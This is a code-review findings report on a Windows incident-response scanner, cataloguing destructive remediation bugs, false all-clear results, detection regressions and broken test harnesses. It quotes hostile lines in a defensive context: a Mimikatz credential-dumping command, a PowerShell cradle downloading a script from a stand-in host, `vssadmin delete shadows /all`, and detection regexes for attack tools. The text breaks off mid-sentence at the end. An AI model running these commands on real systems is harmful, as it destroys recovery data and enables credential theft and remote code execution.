# Review Findings — 2026-07-27 (session 23)

**Status: OPEN. This is the active work queue.** Nothing here is fixed yet.

Seven independent review agents audited the **8,834 insertions across 24 files** committed in the
24 hours to 2026-07-27 (`391b6c4..99e5feb`) — P1 multi-user hive coverage, Build Custom Scan, the
`/api/remediate` TOCTOU fix, the Phase 90 self-detection fix, and the new sandbox harnesses.
Partitioned by file ownership so no two agents reviewed the same file.

**Every area came back with real defects.** Six are rule-#1 violations (the tool damaging a healthy
box — including auto-deleting signed Microsoft ProcDump and every developer's PowerShell profile).
Nine are false-all-clear paths. Two are detection regressions, one affecting *every* scan rather than
just custom ones. And the harness that signed off yesterday's work **is structurally incapable of
failing**, which is why static review caught all of this and the test suite caught none of it.

**The single most consequential finding: P1's filesystem half is a no-op on multi-user boxes.** The
shared `Get-ScanFiles` budget is exhausted by one profile in ~1 second (measured on this machine), so
profiles 2..N get zero filesystem coverage — and the phases print green all-clears. P1 was signed off
as *"fully live-graded end-to-end; nothing known left open."* The registry half does work. See P1-1.

Baseline gate re-run at session start: all 7 engine/server `.ps1` files **parse-clean on live
`powershell.exe` 5.1.26100.8875 with UTF-8 BOM intact**. The defects below are semantic, not syntactic.

---

## Legend

| Tag | Meaning |
|---|---|
| **R1** | Violates user rule #1 — tool auto-selects/auto-applies something that damages a healthy system |
| **FC** | False Clean — prints a green all-clear for a check that could not have fired |
| **REG** | Regression — worked before the last 24h of commits, broken now |
| **AVAIL** | Availability — disables the tool or the host |
| **TEST** | False confidence — a test that cannot fail |

---

## P0 — Rule #1 violations (fix first; these damage client machines)

### R1-1 · Build Custom Scan auto-harvests IOCs from prose into destructive auto-selected findings
`gui/static/js/app.js:2190-2215` · **R1**

**USE THIS SCAN** silently merges every extracted domain, IP and file path into
`reports/custom_iocs.ioc` — no per-IOC review, no confirmation, no vendor allowlist. The button
presents itself as "apply the phase narrowing".

Consumers reached:
- `engine/Phases-1.ps1:2694` — custom C2 domain vs reverse-DNS, **substring** match → `CRITICAL` + `KillProcess`
- `engine/Phases-1.ps1:2641` — custom IOC IP hit → `CRITICAL` + `KillProcess`
- `engine/Phases-3.ps1:510` — custom filename, **leaf-name** match → `HIGH` + `Quarantine`

**Failure scenario.** Operator pastes a Defender/Datto alert email mentioning
`security.microsoft.com`, the file server `10.0.0.5`, and a path containing `chrome.exe`. All three
are extracted (`ZeroBreach-Server.ps1:678, 654, 657`) and merged. The IOC file is now sticky in
`ioc-path`, so on the **next scan in any mode**: every process whose reverse-DNS contains
`microsoft.com` → CRITICAL + KillProcess; everything connected to the file server → CRITICAL +
KillProcess; every `chrome.exe` outside a protected path → HIGH + Quarantine. All CRITICAL/HIGH +
destructive ⇒ **all auto-selected**. Operator types `PURGE`; the box is damaged.

Aggravating: version strings such as `Agent 1.0.0.1` are syntactically valid IPv4 and are extracted
as IOC IPs. The IOC save is `.catch(() => {})` (`app.js:2213`) and the flow proceeds regardless — a
failed merge still reports "Custom scan applied". `Test-VendorTrusted` covers Datto/CentraStage but
nothing else, and CLAUDE.md rule #2 names exactly those vendors as text that *will* appear in alerts.

**Fix (design decision needed).** Either make the IOC merge a separate, explicitly-confirmed action
with per-IOC checkboxes and a benign/vendor-domain allowlist, or drop domains/IPs from the auto-merge
entirely and keep only hashes. Note the IOC Manager already accepted domains — but as a deliberate,
typed, per-entry act. Auto-harvesting them out of free prose is new exposure introduced by `5769ac6`.

### R1-0 · `vssadmin delete shadows /all` ships as a live FixParam, reachable in one click via SELECT ALL
`engine/Phases-1.ps1:3038-3041` · `gui/static/js/app.js:1273` · **R1** · *CLAUDE.md rule #1 names this exact command*

`VSS_DELETE_OPT` is emitted with `-FixParam "vssadmin delete shadows /all /quiet"`. It is `INFO`
severity, so it is **not auto-selected** — which is why it survived review. But **`SELECT ALL` filters
only on `protected` / `vendor_trusted` / `isLikelyFalsePositive`, not on severity** (`app.js:1273`).
One SELECT ALL → PURGE queues an **irreversible whole-machine shadow-copy purge**, destroying every
restore point and every VSS-based backup on the box — on an incident host, where shadow copies are
often the only recovery path left.

CLAUDE.md rule #1 lists `vssadmin delete shadows /all` verbatim as an example of what must never ship
as a FixParam an auto-select can fire on. The rule was read as "not auto-selected ⇒ safe"; SELECT ALL
is a second auto-select path nobody re-checked against it.

`CHANGELOG.md:419`'s claim of "0 `vssadmin delete shadows /all` FixParams" is therefore false as
written. Correct wording: *"0 **auto-selectable** such FixParams; one INFO-severity
`vssadmin delete shadows /all /quiet` remains at `Phases-1.ps1:3041` and is reachable via SELECT ALL."*

**Fix.** Per rule #1 the destructive command belongs in the finding **description** with
`FixAction Info` and no FixParam — and independently, `SELECT ALL` should exclude destructive
FixActions below the auto-select grade, or gate them behind the SELECT HARDENING opt-in.

### R1-2 · Phase 90 quarantines ZeroBreach's own HTML report — self-seeding
`engine/Phases-3.ps1:187, 199, 415, 428-435` · **R1**

`$yaraExt` includes `.htm/.html/.svg`; the new `$YARA_TEXT_ONLY_EXT` carve-out **omits them**, so an
HTML file never reaches the corroboration test and falls through to CRITICAL + Quarantine,
auto-selected.

**Failure scenario.** Any Phase 90 YARA finding's description contains the literal rule name
`Mimikatz_Strings` (`:418, :432`). `ZeroBreach-Server.ps1:277` writes each finding's full `line` into
the exported HTML and `:257` serves it `Content-Disposition: attachment` → the browser saves it to
**Downloads, which is Phase 90's first scan root** (`Phases-3.ps1:162`). Next DEEP scan: `.html`,
unsigned, name-rule match → CRITICAL + Quarantine on a healthy box. **A single demoted POSSIBLE
finding is enough to seed the loop.** Same applies to `KrakenReport_*.html` when a portable/USB
install puts `reports/` under a scanned root.

**Fix.** Add `.htm/.html/.svg` to `$YARA_TEXT_ONLY_EXT`, or invert the test so corroboration applies
to every **non-PE** candidate. Also add the own-path exclusion described in R1-3.

### R1-3 · No self-exclusion by path or hash exists anywhere
`engine/Phases-3.ps1` (candidate loop) · `ZeroBreach-Server.ps1:477-480` and its `Test-RProtected` mirror · **R1 (latent)**

`Test-ProtectedTarget` protects "the IR tool itself" for `KillProcess` **only**. There is no
`$global:ZB_ROOT` / `PSCommandPath` exclusion in Phase 90 or in either remediation guard for
`DeleteFile`/`Quarantine`.

Verified empirically: the Phase 90 fix works **today** only by content coincidence —
`ZeroBreach-Server.ps1` (`mimikatz`), `ZeroBreach-V23.ps1` (`PowerSploit`), `Phases-1.ps1`
(`mimikatz`), `Phases-2.ps1` (`meterpreter`) and `Phases-3.ps1` (4 rules) all match a name-only rule,
and none happens to contain a 200-char alphanumeric run, so all demote. **That is not an invariant.**
One long base64/hex literal added to any of them (a future signature, an embedded cert list) restores
CRITICAL + Quarantine — and Quarantine *moves* `engine/Phases-1.ps1`, breaking the next run.

**Fix.** Own-path exclusion in the Phase 90 candidate loop, plus `zerobreach` path coverage in
`Test-ProtectedTarget` **and** its `Test-RProtected` mirror for DeleteFile/Quarantine.

---

## P1 — False all-clears (an incident host told it is clean)

CLAUDE.md's rule: *"Never print a clean result for a check that could not have fired."* Five live
violations, all introduced or exposed in this window.

### FC-1 · Custom scan runs a consumer phase without its producer → green all-clear
`engine/Phases-1.ps1:3887, 3680, Phases-2.ps1:48` · **FC** · reachable from a **shipped** category

Three phases consume variables produced by an earlier phase. `-Phases` can select the consumer
without the producer, and each degrades to "clean" rather than "blind":

| Consumer | Producer | Result when producer filtered out |
|---|---|---|
| P58 bootkit/MBR (`Phases-1.ps1:3887`) | `$bcdedit2` @ P54 (`:3734`) | `Phases-1.ps1:3893` prints `[OK] BCD BOOT ENTRIES APPEAR CLEAN` |
| P53 ransom notes (`Phases-1.ps1:3680,3688,3714`) | `$ransomScanFiles` @ P51 (`:3614`) | `:3727` prints `[OK] NO RANSOM NOTE FILES DETECTED` |
| P60 DNS tunnelling (`Phases-2.ps1:48`) | `$dnsCache2` @ P59 (`:13`) | `:65` prints `[OK] NO DNS TUNNELING INDICATORS` |

**`data/scan_categories.json`'s `rootkit` category is `[55, 55.5, 56, 57, 58]` — it includes 58 but
not 54.** An operator who pastes a rootkit alert into the new GUI panel is told the BCD is clean on a
box where it was never read. Exactly the scenario the feature exists for. The Summary honesty finding
does not fire (it requires *zero* phases to have run).

Lower impact, same class: `Phases-3.ps1:1786,1788` (P105 correlation heatmap) reads globals set in
P24 and P104; the `previous_infection` category includes 105 but neither producer, so the heatmap
silently correlates nothing. Null-guarded, so it degrades to empty rather than erroring.

**Fix.** Explicit precondition test on the producer variable; emit a "this check was blind" finding
instead of the `[OK]` line when unset. And/or auto-include producers in the `-Phases` expansion. Fix
`rootkit` to include 54.

### FC-2 · The suggested mode silently drops most of the phases the panel says it selected
`ZeroBreach-Server.ps1:708-709` · `ZeroBreach-V23.ps1:2580` · **FC**

The server picks `TRIAGE` whenever any selected phase is ≥ 81. But TRIAGE sets
`$global:QUICK_MODE = $true`, and `Test-PhaseGate` is **AND-ed** onto the existing gate — it can only
narrow. So under TRIAGE every phase < 81 outside the 30-phase QUICK core is gated out despite being
explicitly requested.

| category | requested | actually runs | dropped |
|---|---|---|---|
| phishing_social_eng | 12 | **5** | 68.5, 71, 74, **74.5**, 74.7, 74.8, 74.9 |
| persistence | 28 | 18 | 17, 21.5, 22, 22.5, 24, 26, 32, 32.5, 45.5, 68.5 |
| defense_evasion | 14 | 9 | 25, 34, 38, 39, 40 |
| integrity_forensics | 12 | 7 | 13, 14, 15, 16, 17.5 |
| previous_infection | 12 | 8 | 2, 11, 12, 17.5 |
| c2_rat | 11 | 8 | 59, 60, 61 |
| infostealer | 7 | 5 | 44.5, 68 (**both** sub-81 phases) |

**Failure scenario.** Operator pastes a phishing alert. Banner reads
`CUSTOM SCAN ACTIVE — 12 phase(s), mode TRIAGE`. **Phase 74.5 — the Outlook attachment-cache scan
that quarantines the malicious attachment, the flagship email detection — never runs.** Scan reports
clean. `CUSTOM_SCAN_NO_PHASES_MATCHED` only fires at zero phases, so the common partial case is silent.

### FC-3 · A pasted hash or filename can never match
`ZeroBreach-Server.ps1:718` · `data/scan_categories.json` · **FC**

`$global:CustomIocs.Hashes` and `$global:CustomIocFileNames` have exactly one consumer — **Phase 90**
(`Phases-3.ps1:453/456, 547/562, 510`). `$global:CustomIocs.IPs` has exactly one — **Phase 36**
(`Phases-1.ps1:2608`). **Neither 90 nor 36 appears in `always_include` or in any of the 18 categories.**

So the primary artefact of the whole feature — the SHA256 in the alert you pasted — is written to the
IOC file, logged as `[IOC IMPORT] Loaded 1 indicators`, and then no phase capable of hashing a file
ever executes. The rationale string at `:718` states the opposite: *"IOC(s) extracted and will still
be fed to the scan."*

31 of 139 engine phases are absent from every category: 7, 10, 10.5, 10.6, 18, 19, 33, 36, 37, 46, 70,
73, 75-80, 83, 85-90, 97, 97.5, 99, 99.5, 102.

### FC-4 · A failed hive load emits no honesty finding
`ZeroBreach-V23.ps1:2719` · **FC** · malware-inducible

`if (-not $zbCh.WasMounted -and -not $zbCh.Loaded -and -not $global:UH_ALLOW_LOAD)`. When the
operator **did** pass `-LoadUserHives` but the load failed — NTUSER.DAT absent (`:1592`), `reg load`
non-zero (`:1596`), corrupt hive, deny-ACE — `Loaded` stays false and `UH_ALLOW_LOAD` is true, so no
`UNSCANNED_HIVE_*` fires. `UH_SKIPPED` (`:1618`) only triggers for the load-cap reason, so
`PROFILE_ENUM_TRUNCATED` doesn't fire either. **That profile's registry-persistence checks silently
report clean** — and a deny-ACE on one's own hive is precisely what malware would set.

**Fix.** Condition on `-not (WasMounted -or Loaded)` regardless of `UH_ALLOW_LOAD`, branching the
wording on why.

### FC-5 · Phase 30 prints clean when WMI is unreadable
`engine/Phases-1.ps1:2113-2119` · **FC**

Three `Get-WmiObject -Namespace root\subscription -EA SilentlyContinue` calls; if WMI is
denied/corrupt/stopped all three return empty and the phase prints
`[OK] NO WMI EVENT SUBSCRIPTIONS PRESENT` — indistinguishable from genuinely clean, on the exact
namespace an attacker would disable.

---

## P2 — Detection regressions

### REG-1 · Error recovery silently coarsened from statement-level to phase-level for ~134 phases
`engine/Phases-1.ps1`, `Phases-2.ps1`, `Phases-3.ps1` (all `if (Test-PhaseGate N) { }` wraps) · **REG** · affects **every scan**, not just custom ones

Trap *scoping* is unchanged, but `continue` resumes at the next statement **in the block containing
the trap**, and that block's statement granularity changed. Measured on live 5.1:

```
BEFORE-STYLE (phase bodies directly in the trap's block)
 P7 stmt1 / [RECOVERED] / P7 stmt2 / P7 stmt3 / P8 stmt1   <- phase 7 continues

AFTER-STYLE (each phase wrapped in if (Test-PhaseGate N) {...})
 P7 stmt1 / [RECOVERED] / P8 stmt1                         <- rest of phase 7 GONE
```

A recovered error used to cost one statement; it now costs the **entire remainder of the phase**.
Worst cases by body size: Phase 90 (`Phases-3.ps1:135-585`, ~450 lines of YARA-lite + custom IOC
hashing), 74.6 (~234), 74.7 (~217), 107 (~178), 100.5 (~165), 10 (~152). **The phase still prints its
`PHASE N — … took Ns` timing line, so the log looks complete.** CLAUDE.md documents the System32 ACL
`AccessControl.ObjectSecurity` TypeData collision as a terminating error that fires on live boxes —
that class of fault now silently truncates a whole phase instead of one check.

Commit `5769ac6` claimed "No new trap statements needed anywhere (verified against actual trap
scoping before editing)" — true about scoping, but the behaviour change was neither measured nor
disclosed. Phases 2, 34, 52, 63, 71 carry their own trap inside their own gate and are unaffected.

**Fix.** Add `trap { Write-RecoveredError $_; continue }` as the first statement inside each
`if (Test-PhaseGate N) {` body to restore statement-level recovery — or, if phase-level is the
intent, say so explicitly in CHANGELOG and CLAUDE.md. It is currently an undocumented change in the
direction of *fewer* detections.

### REG-2 · Phase 90 corroboration was applied rule-wide where only one rule is name-only
`engine/Phases-3.ps1:415, 418` · `data/detection_signatures.json` · **REG**

Of the five weakened rules only `Lazagne_Stealer` is genuinely just a tool name:

| rule | pattern | genuinely name-only? |
|---|---|---|
| `Mimikatz_Strings` | `(sekurlsa::\|lsadump::\|mimikatz\|gentilkiwi)` | **no** — command syntax |
| `Meterpreter_Strings` | `(metsrv\|stdapi_\|meterpreter\|reflective_loader)` | **no** — payload internals |
| `Sliver_Implant` | `(sliver-server\|sliver-client\|implant\.bin)` | **no** — artifact names |
| `Lazagne_Stealer` | `(LaZagne\|lazagne_program)` | yes |
| `WinPwn_Recon` | `(WinPwn\|PowerSploit\|PowerView\|Invoke-Mimikatz\|Get-PassHashes)` | **no** — function names |

**Evasion.** `%TEMP%\a.bat` containing `mimikatz.exe sekurlsa::logonpasswords exit`, or a `.ps1`
cradle `IEX (New-Object Net.WebClient).DownloadString('http://x/mk.ps1')`, has no 200-char alnum run
→ demoted to POSSIBLE + Info with no FixParam. A stock `PowerView.ps1`/`PowerUp.ps1` likewise.

The comment at `:409-411` justifies the rule by claiming a real sample "embeds **or fetches**" its
payload — but only *embedding* leaves a blob; **the fetch case, the dominant modern shape, satisfies
nothing.** The description at `:418` also asserts the match was "a bare tool-name string" even when
it was `sekurlsa::` — actively misleading the operator.

Not a deleted detection (downgrade to POSSIBLE + Info is the correct CLAUDE.md remedy) — the defect
is that it is *rule-wide* where *alternative-wide* was needed. **Fix.** Split the rules in data
(`Mimikatz_Names` vs `Mimikatz_Invocation`) and carve out only the name half; or capture `$Matches[0]`
and test the matched substring against a name-only token list.

---

## P3 — Availability (tool or host disabled)

### AVAIL-1 · Permanent remediation lockout from one malformed report name
`ZeroBreach-Server.ps1:2009-2015` · **AVAIL** · introduced by the TOCTOU fix in `bcbf188`

`:2009` sets `Remediating = $true`; `:2015` calls
`[System.IO.Path]::GetFileName("$($parsed.report)")`. On .NET Framework that method scans the whole
string and **throws** `ArgumentException` for any of `| < >` or control chars 0x01–0x1F. Measured live:

```
THROW   [audit_a|b.json]  -> MethodInvocationException
THROW   [audit_<x>.json]  -> ...
THROW   [audit_?x.json]   -> ...   (0x01)
NOTHROW [audit_*.json]    -> audit_*.json
```

It is a .NET terminating throw — `$ErrorActionPreference` does not help — and there is **no
`try`/`finally`/`trap` around the set→dispatch region. The exception unwinds to the accept loop's
generic catch at `:2431`, which cannot reset the flag.**

**Failure scenario.** Any local non-browser client (`Invoke-RestMethod` needs no CSRF token per
`Test-RequestAllowed:191`; the sandbox harnesses POST exactly this way) sends
`{"report":"audit_a|b.json","ids":["x"]}`. `Remediating` is stuck `$true` for the life of the
process. Every subsequent PURGE returns `400 remediation already running`, and since `/api/state`
never exposes `remediating`, the operator sees only a toast with no running remediation anywhere.
**Core function dead until server restart, mid-incident.** Before `bcbf188` the same throw was
harmless; the fix created the exposure.

**Fix.** Sentinel + `finally`, not more inline resets:
`try { …; $dispatched = $true } finally { if (-not $dispatched) { $script:State.Remediating = $false } }`.

### AVAIL-2 · `/api/scan/start` re-opens the race that `bcbf188` just closed
`ZeroBreach-Server.ps1:2204` (check) vs `:1066` (set, inside `$script:SCAN_SCRIPT`) · **AVAIL**

Identical deferred-set defect. Measured window with a minimal runspace:

```
BeginInvoke returned at 42.0 ms; flag still false right after: True;
flag raised at 116.3 ms; WINDOW = 74.3 ms
```

74 ms for a *trivial* script; `SCAN_SCRIPT` does argument parsing first, so the real window is
~100–200 ms. **No concurrency is required — sequential requests over loopback fit inside it.**

- **It defeats the fix.** `POST /api/scan/start` then `POST /api/remediate` ~100 ms later: remediate's
  guard at `:1985` reads `$false`, passes, and remediation runs **concurrently with a launching scan** —
  deleting/quarantining/killing while the engine enumerates the same filesystem. The resulting
  `audit_*.json` / `KrakenBaseline_*.json` are captured against a filesystem mutating underneath them,
  and an operator later remediates from that report.
- **`/api/scan/start` never checks `Remediating` at all.** Starting a scan during a genuine PURGE runs
  `SCAN_SCRIPT`'s reset block (`:1058-1069`): `Findings.Clear()`, `EventLog.Clear()`, `ScanEpoch++` —
  **wiping the live `[FIX]` log the remediation runspace is writing into** and rewinding every SSE
  client. The operator loses the remediation narrative mid-PURGE.
- **Double scan is genuine corruption.** `$ScanState.Process` is overwritten so the first engine
  becomes **unkillable via `/api/scan/abort`** (`:2331`) — an elevated DEEP orphaned ~10 min. Both
  runspaces share one `Findings`/`ThreatCounts`/phase counter. Both `finally` blocks write
  `audit_<yyyyMMdd_HHmmss>.json` at second granularity — same second, one silently overwrites the
  other. Engine-report discovery (`:1422-1426`) can attach **scan B's** baseline to scan A. The first
  scan's `finally` sets `Running=$false; ScanComplete=$true` while the second still runs → GUI reports
  COMPLETE on an incident host with a scan in flight, and a third can start.

`app.js:923` has a client-side `if (STATE.scanning) return;` so same-tab double-click is covered — two
tabs, native shell + browser, the Ctrl+K palette, or any harness are not.

### AVAIL-3 · `Restart-Service vmcompute -Force` fires unprompted and kills every VM on the host
`tools/sandbox-test/Invoke-SandboxTest.ps1:60-73` · **AVAIL** · damages operator's machine

Runs unconditionally on any orphan-VM hit. **Kills every Hyper-V VM and WSL2 distro on the host.**
The message at `:63` tells the operator to "confirm no OTHER workload is relying on it first" — and
then does it anyway, with no prompt and no `-WhatIf`. Also: the pre-check looks only for
`vmmemWindowsSandbox`, not `WindowsSandboxClient`/`WindowsSandboxServer`; no lock file, so two
concurrent invocations race; no `#Requires -RunAsAdministrator`, so a non-elevated shell throws an
opaque access-denied under `$ErrorActionPreference='Stop'`.

Neither guest harness shuts the sandbox down and the orchestrator never closes it, so **every run —
success or timeout — leaves the orphan `vmmemWindowsSandbox` CLAUDE.md warns about.**

### AVAIL-4 · Self-DoS via `/api/scan/analyze-text`
`ZeroBreach-Server.ps1:723-729, 2119, 647-660` · **AVAIL**

- `Read-RequestBody` is a bare `ReadToEnd()` with **no size cap**, and `Read-JsonBody` parses the
  whole body — the `if ($text.Length -gt 50000)` guard at `:2119` runs *after* both. A 200 MB POST is
  fully read and JSON-parsed before truncation.
- `Select-Object -Unique` is O(n²). Measured: **3.4 s for 6,250 unique domains** from a 50,000-char
  paste (the regex itself: 8 ms). PS 5.1 is slower. Repeated for hashes, IPs, files, registry — a
  crafted paste stacks them.
- The accept loop is strictly single-threaded and `Handle-Request` synchronous, so **everything** —
  SSE, live scan progress, `/api/scan/abort` — stalls for the duration. The route's own comment claims
  it is "safe to call any time (including mid-scan)".
- Reachable with **no CSRF token** by any non-browser local client, with no rate limit.

---

## P4 — Tests that cannot fail (why none of the above was caught)

### TEST-1 · The malware-detection harness asserts nothing
`tools/sandbox-test/harness-malware-detection.ps1:212-277` vs `README.md:14-17` · **TEST**

The README claims it "**asserts**: masquerading-PE findings, macro-document findings, known-hash IOC
findings, YARA-lite hits, a sane auto-destructive count, 0 `RECOVERED ERROR`s". The code **only logs
counts A–M**. No threshold, no verdict line, no differentiated exit code, no marker suppression.
**Every count can be `0` and the harness still writes `MALWARE_DETECTION_DONE` and the orchestrator
still prints `DONE.`** The WebView2 harness beside it *does* compute a `VERDICT` (`:191-195`) — the
asymmetry is the tell.

**Consequence: the CHANGELOG's "clean PASS, re-validated against current HEAD" for this harness is
not supported by what it checks.** The run happened; it could not have failed.

### TEST-2 · Stale completion marker → instant false DONE
`Invoke-SandboxTest.ps1:80, 147, 205` · **TEST**

`$outDir` is never cleaned between runs and markers are ordinary host files. Second invocation:
`Test-Path` is true immediately → prints `DONE. Results: …` within milliseconds while the sandbox is
still booting. Both harnesses log via `Add-Content`, so the operator then reads the **previous** run's
verdict lines. Nothing distinguishes "re-ran and passed" from "never ran at all".

### TEST-3 · Re-running `-Stage MalwareDetection` tests a stale engine
`Invoke-SandboxTest.ps1:163-168` · **TEST**

`Copy-Item $repoRoot\engine … -Recurse -Force` **nests** instead of overwriting once the destination
exists. Verified live:

```
run1 -> dst\engine\Phases-1.ps1         = v1
run2 -> dst\engine\Phases-1.ps1         = v1   (STILL)
        dst\engine\engine\Phases-1.ps1  = v2
```

The server loads run 1's code forever. Edit a phase, re-run, get an unchanged result. **The same
script explicitly guards this for the WebView2 stage and not here.**

### TEST-4 · A failed `npx tauri build` is not detected
`Invoke-SandboxTest.ps1:104` · **TEST**

No `$LASTEXITCODE` check — `$ErrorActionPreference='Stop'` does not apply to native-command exit
codes. Falls through to a staleness guard that compares the exe only against `main.rs`, so a build
broken by `Cargo.toml`/`tauri.conf.json`/any other `.rs` leaves a stale exe, the guard passes, and the
harness tests pre-fix code and reports PASS. **This is the 2026-07-26 Stage-D failure this file was
written to prevent, reachable by a different route.**

### TEST-5 · Sample-integrity gate is weaker than both README and CLAUDE.md require
`harness-malware-detection.ps1:109, 96-105, 117-127` · **TEST**

Aborts only when `$valid.Count -eq 0` — i.e. only if **every** sample is empty. README:39 claims it
"hard-fails if **any** sourced sample lands at 0 bytes"; CLAUDE.md's rule is per-sample. Four of five
theZoo families extracting to 0 bytes (the exact `tar`/password bug) → harness proceeds and the four
missing families read as "scanned, nothing found". **Magic bytes are computed at `:96-105` and never
asserted** — `$kind` is logged and discarded; a 40-byte `readme.txt` counts as a "VALID sample". If no
MZ sample exists, `$iocHash` stays `$null`, the IOC leg is silently skipped, and assertions A and C
report 0 with nothing marking the run invalid.

### TEST-6 · Assertions L, M, G, H are structurally incapable of failing
`harness-malware-detection.ps1:242-275` · **TEST**

`(L)` greps the console log for `'Custom Scan|Phase Gate|phase filter'` and reports "should be
ABSENT" — but the engine emits **no such banner at all** (`-Phases` produces zero console output;
`ZeroBreach-V23.ps1:2591-2610` just fills a HashSet). It "proves" non-interference by looking for
something that never exists. `(M)` greps for `hive` unanchored (matches `archive`) with no threshold.
`(G)/(H)` claim "P1's multi-user hive coverage exercised" in a Windows Sandbox guest that has exactly
**one** profile (`WDAGUtilityAccount`). Only `(I)` is a real proxy.

### TEST-7 · Other harness defects
- **`echo EXITCODE=%ERRORLEVEL%>>` writes nothing** (`Invoke-SandboxTest.ps1:117, 175`) — `cmd`
  consumes the digit before `>>` as a redirection handle. Verified empirically. Under a console-less
  `LogonCommand` this is the one field distinguishing "failed to parse" from "ran and finished".
  Fix: one space before `>>`.
- **Early-exit paths write no completion marker** (`harness-malware-detection.ps1:21`,
  `harness-webview2-dialog.ps1:19, 96`) → orchestrator polls the full timeout (60 min default) after a
  2-second staging failure, then never surfaces `trace.txt`/`stderr.txt`.
- **A timed-out scan still ends in "DONE"** (`harness-malware-detection.ps1:196-208, 283`) — on expiry
  the `/api/report` call throws, the outer catch skips assertions A–I entirely, and the DONE marker is
  written anyway. The internal 45-min cap is also shorter than the orchestrator's 60-min default.
- **WebView2 verdict branch 2 calls an invisible dialog a PASS** (`harness-webview2-dialog.ps1:193`) —
  a regression where `MessageBoxW` stops rendering but the 120 s deadline still fires reports PASS. It
  should be INCONCLUSIVE. The screenshot at `:151-162` is captured unconditionally and **never
  validated**, so "screenshot-verified" is a manual claim.
- **`$_.target` is empty on every assertion line** (`:215, 219, 223, 227, 238`) — `/api/report` records
  (`ZeroBreach-Server.ps1:541-557`) have no `target` key; that belongs to the SSE `finding` shape. The
  rule-#1 review line (F) renders with a blank path. Use `$_.line` or `$_.fix_param`.
- **Assertion F over-counts** (`:233-236`) — filters on severity + fix_action only; the GUI also
  excludes `protected` and `vendor_trusted`, both supplied by `/api/report`. F is an upper bound, not
  the auto-selected set — misleading against the recorded 7/8/10 baselines.
- **Remediation is untested here** — neither harness calls `/api/remediate`, so the applied/blocked
  split, `server_events_*.log`, the `remediation_audit_*.jsonl` hash chain and the ~30 s spacing rule
  are not covered, **yet CHANGELOG/CLAUDE.md cite Stage C and P1 Stage 6 as live-proven.** Those
  proofs are not reproducible from `tools/sandbox-test/`.
- **Safety wording** — README:11 and `harness-malware-detection.ps1:10` say the harness "**Detonates**"
  real malware. It does not; it only places files on disk. Safer than advertised, but misleading.
  Also `:260-264` does an unfiltered recursive `Copy-Item reports\* → C:\ZBOut\engine_reports`, and
  `C:\ZBOut` maps into the **repo checkout on the host**. `reports/quarantine/` sits inside that glob —
  the moment anyone adds a remediation step, real `.quar` malware copies land in the project directory.
  Make it an allowlist (`*.json`, `*.log`) with `quarantine/` excluded.

---

## P5 — Reporting honesty and lower-severity items

### REP-1 · Filtered runs produce a client-facing report claiming full coverage
`engine/Summary.ps1:33, 58, 258` · `ZeroBreach-V23.ps1:2632, 2650`

`$phaseCount = $PhasePlan.Max`, printed verbatim to console and to the **HTML deliverable**. A
`-Phases 20,21` FULL run yields a client report headed **"FULL (80 phases)"** beside
"LOW — SYSTEM APPEARS RELATIVELY CLEAN". The audit JSON (`Summary.ps1:100-138`) records `Mode`,
`Paranoid`, `Stealth` but has **no field for the phase filter** — nothing downstream can distinguish
a filtered run from a full one.

### REP-2 · `-Phases` fails open on unparseable input, with no notice
`ZeroBreach-V23.ps1:2597` · `engine/Summary.ps1:26`

Verified live: `-Phases "abc"` yields `Count=0`, so `Test-PhaseGate` returns `$true` for everything
**and** the honesty check (which requires `PHASE_TIMINGS.Count -eq 0`) is skipped. An operator
requesting a targeted scan silently gets a full-breadth scan. Also `-Phases "1e2"` parses to 100 and
`"Infinity"` is accepted into the allowlist. Partial matches are equally silent: `-Phases 20,21,29,999`
in QUICK runs 20 and 21 and drops 29 (QUICK-gated) and 999 (nonexistent) with no warning.

### REP-3 · Filtered runs write an indistinguishable baseline
`engine/Summary.ps1:144` — a 2-phase custom scan writes `KrakenBaseline_<stamp>.json` with no marker.
It appears in the GUI baseline picker; selecting it as `-Baseline` makes the next full scan report the
entire unscanned surface as newly-appeared findings.

### REP-4 · Progress contract drift on a filtered run
`ZeroBreach-Server.ps1:1058` derives `PhaseTotal` from `$MODE_PHASES` only. A custom ransomware scan
(`3,4,6,51,52,53,54`) under FULL freezes at `Phase 54/80` / 68% while the completion modal says
COMPLETE. No division by zero; monotonicity preserved.

### REP-5 · The new profile banner over-claims coverage
`ZeroBreach-V23.ps1:2415-2417` prints `PROFILES EXAMINED: <reachable> of <total>`, but
`ProfileReachable` is *filesystem* reachability. Without `-LoadUserHives` on a 3-profile box with 2
users logged off it reads "PROFILES EXAMINED: 3 of 3" while registry persistence was checked for
exactly one. It also only renders in interactive non-`-Auto` runs, so the GUI never shows it.
Suggest `FILESYSTEM: n of m · REGISTRY: k of m`.

### REP-6 · Missing/corrupt `scan_categories.json` is indistinguishable from "matched nothing"
`ZeroBreach-Server.ps1:94-100, 684` — set to `$null` once at server start; the route then returns
HTTP 200 with `phases: []` and *"No categories or IOCs matched this text"*. Fail-closed in effect
(the GUI refuses an empty list) but silent about the cause. Edits to the data file also require a
server restart, which the file's own `_meta.note` does not mention.

### MISC-1 · `Test-ProtectedTarget` misses `%WINDIR%\hh.exe`
`ZeroBreach-Server.ps1:435` and mirror `:1571` · `Phases-1.ps1:3214, 3224`

Phase 45 now probes `$env:WINDIR\$an` (added for `hh.exe`) and ships CRITICAL + `RunCmd
"Rename-Item 'C:\Windows\hh.exe' …"`. The guard tests `^[a-z]:\\windows\\` — anchored at string
start, so it never matches a command line — and `\(System32|SysWOW64|WinSxS)\`, which
`C:\Windows\hh.exe` lacks. Only fires on genuine tamper, so not a healthy-box rule-#1 hit, but an
unintended hole. Drop the `^` or add `\\Windows\\[^\\]+\.exe`.

### MISC-2 · Phase 10 allowlist: the advertised compensating control doesn't cover the case that matters
`data/detection_signatures.json` `_comment_temp_exe_staging_toolcache_paths` · `Phases-1.ps1:29-30, 648, 660, 663-665, 684`

The comment states the PE-masquerade sniff is "NOT gated on this". Literally true, structurally
irrelevant: the sniff only runs over `$otherFiles` — files whose extension is *not* in `$malExt`. An
attacker doing `mkdir %TEMP%\claude` and dropping `payload.exe` hits `Test-ZbP10BenignPath` → INFO +
Info and is never content-checked. The backstop only covers *renamed* payloads, which the allowlist
could never have hidden anyway. Correct the claim or extend the sniff to allowlisted `$malExt` files.

### MISC-3 · `-Phases` unvalidated in the elevation argument string
`ZeroBreach-V23.ps1:118` — `$argList += " -Phases `"$Phases`""`, later `Start-Process powershell
$argList -Verb RunAs`. A `"` in the value breaks quoting and can append parameters to the elevated
child. Same pattern as the pre-existing `-IocFile`/`-Baseline`/`-OutDir`/`-Smtp*` lines, so not a new
